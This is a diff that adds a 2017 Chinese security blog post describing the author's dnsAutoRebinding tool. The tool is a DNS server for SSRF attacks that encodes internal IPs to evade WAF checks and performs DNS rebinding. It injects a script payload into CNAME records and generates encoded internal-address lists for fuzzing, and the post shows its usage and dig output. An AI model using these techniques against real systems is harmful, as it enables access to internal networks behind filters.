@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <link rel="shortcut icon" href="../../../public/1616.ico">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>Dns Auto Rebinding - Posted By Tr3jer</title>
+    <meta name="description" content="Hacking for fun. - Tr3jer_CongRong"/>
+    <link rel="stylesheet" href="/css/Tr3jer.css" type="text/css" />
+    <link rel="stylesheet" href="/css/syntax.css" type="text/css" />
+  </head>
+  <body>
+    <div class="site">
+      <div class="post-content">
+        <div id="post">
+          <h1 id="dns-auto-rebinding">Dns Auto Rebinding</h1>
+<p class="date">25 Jun 2017 - Tr3jer_CongRong</p>
+
+<p>      ssrf时难免会被防火墙拦截恶意返回值，使用过xip.io但效果一般。项目地址：
+<a target="_blank" href="https://github.com/Tr3jer/dnsAutoRebinding">Github</a></p>
+
+<p>      ssrf、ssrf内网地址fuzz、dns二次rebinding、支持ipv4/ipv6、支持ip地址转换码、dns记录污染(文末一个0day为例)。脑图在脑子里，懒得画了。</p>
+
+<p>support Record Type and Encoding：</p>
+
+<pre><code>MX = ipv4/ipv6/hex
+A = ipv4/en/int/hex
+AAAA = ipv6/int/hex
+CNAME = ipv4/ipv6/hex
+</code></pre>
+
+<p>配置监听服务器example.com：</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>record type</th>
+      <th>record</th>
+      <th>record value</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>A</td>
+      <td>ns</td>
+      <td>server ip</td>
+    </tr>
+    <tr>
+      <td>NS</td>
+      <td>test</td>
+      <td>ns.example.com</td>
+    </tr>
+  </tbody>
+</table>
+
+<blockquote>
+  <p>sudo pip install ipaddr</p>
+</blockquote>
+
+<p>修改lib/config.conf：
+maindomain = test.example.com.
+注意根地址.要加</p>
+
+<pre><code>Usage: sudo python main.py {Options}
+
+Options:
+  -h, --help            show this help message and exit
+  -t 300, --TTL=300     ttl value , 0 By Default
+  -y A/AAAA/CNAME/MX, --Type=A/AAAA/CNAME/MX
+                        Record Type , A By Default
+  -e int/hex/en, --Encoding=int/hex/en
+                        Record Encoding , None By Default
+  -r, --Rebinding       The Second Time Query Return Target Ip
+  -p "&lt;script&gt;alert(/xss/)&lt;/script&gt;", --payload="&lt;script&gt;alert(/xss/)&lt;/script&gt;"
+                        Specified Record , Support CNAME/MX
+
+</code></pre>
+
+<p>-y选项指定以什么记录类型返回：</p>
+
+<p><code>-y A/AAAA/CNAME/MX, --Type=A/AAAA/CNAME/MX Record Type , A By Default</code></p>
+
+<p>-t选项指定TTL值：</p>
+
+<p><code>-t 300, --TTL=300     ttl value , 0 By Default</code></p>
+
+<p>直接A记录返回ipv4地址：</p>
+
+<p><code>sudo ./main.py</code></p>
+
+<pre><code>➜  ~ dig 192.168.1.1.test.example.com
+
+; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; 192.168.1.1.test.example.com
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 50359
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;192.168.1.1.test.example.com.	IN	A
+
+;; ANSWER SECTION:
+192.168.1.1.test.example.com. 0	IN	A	192.168.1.1
+
+;; AUTHORITY SECTION:
+test.example.com.		227	IN	NS	ns.example.com.
+</code></pre>
+
+<p>server:
+<code>[21:54:16] client ip:44486 =&gt; A =&gt; 192.168.1.1.test.example.com.</code></p>
+
+<p>hex编码：</p>
+
+<p><code>sudo ./main.py -e hex</code></p>
+
+<pre><code>➜  ~ dig 31302e302e302e31.test.example.com
+
+; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; 31302e302e302e31.test.example.com
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 1585
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;31302e302e302e31.test.example.com.	IN	A
+
+;; ANSWER SECTION:
+31302e302e302e31.test.example.com. 0 IN	A	10.0.0.1
+
+;; AUTHORITY SECTION:
+test.example.com.		600	IN	NS	ns.example.com.
+</code></pre>
+
+<p>server:
+<code>[22:00:42] client ip:30150 =&gt; A =&gt; 31302e302e302e31.test.example.com.</code></p>
+
+<p>int编码：</p>
+
+<p><code>sudo ./main.py -e int</code></p>
+
+<pre><code>➜  ~ dig 3232235777.test.example.com
+
+; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; 3232235777.test.example.com
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 18066
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;3232235777.test.example.com.	IN	A
+
+;; ANSWER SECTION:
+3232235777.test.example.com. 0	IN	A	192.168.1.1
+
+;; AUTHORITY SECTION:
+test.example.com.		456	IN	NS	ns.example.com.
+</code></pre>
+
+<p>server:
+<code>[22:03:00] client ip:5240 =&gt; A =&gt; 3232235777.test.example.com.</code></p>
+
+<p>      因为waf会识别出内网地址才用的上本项目，那么waf大可识别进制转换这种，所以要自己写个地址转换方法：</p>
+
+<p>num to en:</p>
+
+<pre><code>./lib/common.py 192.168.1.1
+
+1. Single IP Covert For En
+2. Build IP List
+[+] [1 By Default/2]
+bjckbgikbkb
+</code></pre>
+
+<p><code>sudo ./main.py -e en</code></p>
+
+<pre><code>➜  ~ dig bjckbgikbkb.test.example.com
+
+; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; bjckbgikbkb.test.example.com
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 5115
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;bjckbgikbkb.test.example.com.	IN	A
+
+;; ANSWER SECTION:
+bjckbgikbkb.test.example.com. 0	IN	A	192.168.1.1
+
+;; AUTHORITY SECTION:
+test.example.com.		20	IN	NS	ns.example.com.
+</code></pre>
+
+<p>server:
+<code>[22:10:22] client ip:8434 =&gt; A =&gt; bjckbgikbkb.test.example.com.</code></p>
+
+<p>dns二次rebinding:</p>
+<pre><code>sudo ./main.py -r
+Input Safe Ip? [Address/Req By Default]8.8.8.8
+</code></pre>
+<p>      选择性输入目标信任的地址，比如在ssrf时防火墙在验证dns返回值是否存在于白名单。默认为发起请求的地址。(记得特殊情况需要指定记录类型)</p>
+
+<p>第一次：</p>
+
+<pre><code>➜  ~ dig 192.168.1.1.test.example.com
+
+; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; 192.168.1.1.test.example.com
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 59544
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;192.168.1.1.test.example.com.	IN	A
+
+;; ANSWER SECTION:
+192.168.1.1.test.example.com. 0	IN	A	8.8.8.8
+
+;; AUTHORITY SECTION:
+test.example.com.		461	IN	NS	ns.example.com.
+</code></pre>
+
+<p>第二次：</p>
+
+<pre><code>➜  ~ dig 192.168.1.1.test.example.com
+
+; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; 192.168.1.1.test.example.com
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 45312
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;192.168.1.1.test.example.com.	IN	A
+
+;; ANSWER SECTION:
+192.168.1.1.test.example.com. 0	IN	A	192.168.1.1
+
+;; AUTHORITY SECTION:
+test.example.com.		501	IN	NS	ns.example.com.
+</code></pre>
+
+<p>dns记录污染：</p>
+
+<p><code>sudo ./main.py -p "&lt;script&gt;alert(/xss/)&lt;/script&gt;" -y CNAME</code></p>
+
+<pre><code>➜  ~ dig test.example.com
+
+; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; test.example.com
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 5073
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;test.example.com.			IN	A
+
+;; ANSWER SECTION:
+test.example.com.		0	IN	CNAME	&lt;script&gt;alert\(/xss/\)&lt;/script&gt;test.example.com.
+</code></pre>
+
+<p><img src="http://7xiw31.com1.z0.glb.clouddn.com/0day.png" alt="" /></p>
+
+<p>      这个怎么玩取决于你的小脑袋瓜的脑回路了。如果防火墙还要验证是否为信任地址的话修改lib/common.py：</p>
+
+<pre><code>elif payload != 'None' and payload.find(mainDomain) == -1:
+    record = payload + "信任地址."
+</code></pre>
+
+<p>ipListBuild:
+批量生成网段地址，选择性编码，适合ssrf内网地址fuzz。</p>
+
+<pre><code>python lib/common.py 192.168.1.1
+
+1. Single IP Covert For En
+2. Build IP List
+[+] [1 By Default/2]2
+[+] Please Input Segment Length [24 By Default]
+[+] Please Input Encoding ['ipv4' By Default]hex
+[+] Please Input Server Root Address [test.example.com By Default]
+[+] Stored in the 20170625223912_test_example_com_hex.txt
+[root@VM_34_252_centos dnsAutoRebinding]# head -n 5 20170625223912_test_example_com_hex.txt
+3139322e3136382e312e31.test.example.com
+3139322e3136382e312e32.test.example.com
+3139322e3136382e312e33.test.example.com
+3139322e3136382e312e34.test.example.com
+3139322e3136382e312e35.test.example.com
+</code></pre>
+
+
+        </div>
+      </div>
+      
+      <div id="disqus_thread"></div>
+      <script type="text/javascript">
+      /* * * CONFIGURATION VARIABLES * * */
+      var disqus_shortname = 'tr3jer';
+      
+      /* * * DON'T EDIT BELOW THIS LINE * * */
+      (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+      <div id="disqus_thread"></div>
+
+      <!-- footer -->
+      <div class="footer">
+        <div class="contact">
+          <p>
+            <a href="/" style="text-decoration: none; margin-right: 5px;">Index</a> |&nbsp;
+            <a href="/feed.xml" target="_blank" style="text-decoration: none; margin-right: 5px;">RSS</a> |&nbsp;
+            <a href="http://weibo.com/Tr3jer" target="_blank" style="text-decoration: none; margin-right: 5px;">Weibo</a> |&nbsp;
+            <a href="https://twitter.com/Tr3jer" target="_blank" style="text-decoration: none; margin-right: 5px;">Twitter</a> |&nbsp;
+            <a href="/link" target="_blank" style="text-decoration: none; margin-right: 5px;">Links</a> |&nbsp;
+            <a href="/mail.txt" target="_blank">Gmail</a>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div style="display: none;">
+      <script src="http://s11.cnzz.com/z_stat.php?id=1256907244&web_id=1256907244" language="JavaScript"></script>
+    </div>
+  </body>
+</html>
